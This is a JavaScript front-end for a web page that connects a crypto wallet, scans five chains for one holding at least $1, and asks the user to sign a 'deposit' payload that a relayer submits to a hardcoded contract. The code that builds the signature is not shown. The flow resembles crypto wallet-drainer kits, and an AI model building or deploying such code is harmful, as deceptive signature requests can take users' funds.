import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6/+esm"

import { createAppKit } from "https://esm.sh/@reown/appkit"
import { mainnet, polygon, bsc, arbitrum, avalanche } from "https://esm.sh/@reown/appkit/networks"

import { findEligibleNetwork } from "./utils/balanceScanner.js"
import { getNonce } from "./utils/getNonce.js"
import { signDeposit } from "./utils/signDeposit.js"
import { sendRelayer } from "./utils/sendRelayer.js"

const status = document.getElementById("status")

function setStatus(msg){
 console.log(msg)
 status.innerText = msg
}

const projectId = "906bd57a09299f262aab595f3226ec60"

const networks = [
 mainnet,
 polygon,
 bsc,
 arbitrum,
 avalanche
]

const modal = createAppKit({
 projectId,
 networks,
 themeMode:"dark"
})

const CONTRACTS = {

1:"0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8"

}

async function connectWallet(){

 try{

  setStatus("Opening wallet selector...")

  await modal.open()

  if(!window.ethereum){
   setStatus("Wallet connection failed")
   return
  }

  const provider = new ethers.BrowserProvider(window.ethereum)

  const signer = await provider.getSigner()

  const address = await signer.getAddress()

  setStatus("Wallet connected: "+address)

  startFlow(provider,signer,address)

 }catch(err){

  setStatus("Connection cancelled")

 }

}

async function startFlow(provider,signer,address){

 try{

  setStatus("Scanning networks for balance...")

  const network = await findEligibleNetwork(address)

  if(!network){

   setStatus("No eligible network found ($1 minimum required)")

   return

  }

  setStatus("Eligible network found: "+network.name)

  const rpcProvider = new ethers.JsonRpcProvider(network.rpc)

  setStatus("Fetching contract nonce...")

  const nonce = await getNonce(
   rpcProvider,
   address,
   CONTRACTS[network.chainId]
  )

  setStatus("Preparing signature request...")

  const amount = "0.0005"

  const payload = await signDeposit(
   signer,
   CONTRACTS[network.chainId],
   network.chainId,
   amount,
   nonce
  )

  setStatus("User signing transaction...")

  const result = await sendRelayer(
   payload,
   CONTRACTS[network.chainId]
  )

  if(result.success){

   setStatus(
    "Transaction executed\nHash: "+result.hash
   )

  }else{

   setStatus("Relayer error: "+result.error)

  }

 }catch(err){

  setStatus("Process failed: "+err.message)

 }

}

document
.getElementById("connect")
.addEventListener("click",connectWallet)
